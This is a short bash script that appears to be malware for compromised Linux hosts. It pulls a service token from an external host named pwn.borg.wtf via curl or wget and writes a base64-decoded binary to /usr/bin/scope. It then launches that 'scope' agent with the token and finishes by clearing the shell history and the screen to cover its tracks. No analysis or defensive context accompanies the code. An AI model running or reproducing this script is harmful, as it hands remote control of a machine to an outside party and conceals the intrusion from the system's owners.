#!/bin/bash

SCOPEFILE=''
SCOPEMYIP=$(curl -s http://pwn.borg.wtf/scope_id.dat || wget -q -O - http://pwn.borg.wtf/scope_id.dat)

if [ ! -f "/usr/bin/scope" ]; then echo $SCOPEFILE | base64 -d > /usr/bin/scope; chmod +x /usr/bin/scope; fi
scope stop 2>/dev/null
scope launch --service-token=$SCOPEMYIP

history -c
clear
